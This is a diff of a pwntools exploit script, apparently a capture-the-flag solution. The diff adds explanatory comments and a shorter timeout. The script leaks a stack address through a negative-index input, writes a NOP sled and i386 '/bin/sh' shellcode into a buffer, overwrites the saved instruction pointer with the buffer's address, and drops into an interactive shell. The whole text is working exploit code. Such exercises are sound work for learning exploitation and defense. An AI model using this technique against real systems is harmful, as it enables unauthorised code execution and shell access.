@@ -15,17 +15,25 @@ if args['REMOTE']:
 else:
     r = process(e.path)
     gdb.attach(r, "b 39")
+
+# leak the address of the buffer
 r.sendline("3")
 r.sendline("-3")
 r.recvuntil("ID: ")
 stack_leak = int(r.recvuntil(",")[:-1], 10)
 log.success("leaked stack addr: " + hex(np.uint32(stack_leak)))
 scaddr = stack_leak
+
+# put shellcode in the buffer, then overwrite eip
 sc = "\x90"*20 + asm(shellcraft.i386.linux.sh())
 buf = fit({0:sc}, length=80) + p32(np.uint32(scaddr))
+
+# send the payload
 log.info("Sending payload...")
 put(r, buf)
 r.sendline("4")
-r.recvrepeat(1)
+r.recvrepeat(.5)
 r.sendline("id")
+
+# give me a shell!
 r.interactive()
